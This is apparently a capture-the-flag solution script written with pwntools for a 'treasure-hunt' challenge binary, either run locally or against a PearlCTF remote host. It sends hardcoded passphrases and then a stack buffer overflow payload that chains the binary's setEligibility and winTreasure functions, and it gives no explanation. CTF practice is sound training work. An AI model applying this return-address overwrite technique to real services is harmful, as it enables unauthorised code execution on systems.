#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln", checksec=False)
context.binary = exe

if args.LOCAL:
    p = process([exe.path])
    if args.DEBUG:
        gdb.attach(p)
else:
    p = remote("treasure-hunt.ctf.pearlctf.in", 30008)

input()

s2 = [b'whisp3ring_w00ds', b'sc0rching_dunes', b'eldorian_ech0', b'shadow_4byss', b'3ternal_light']

for i in range(4):
	p.sendlineafter(b'proceed: ', s2[i])

payload = b'a'*0x48 + p64(exe.sym['setEligibility']) + p64(exe.sym['winTreasure'])
p.sendlineafter(b'win:- ', payload)

p.interactive()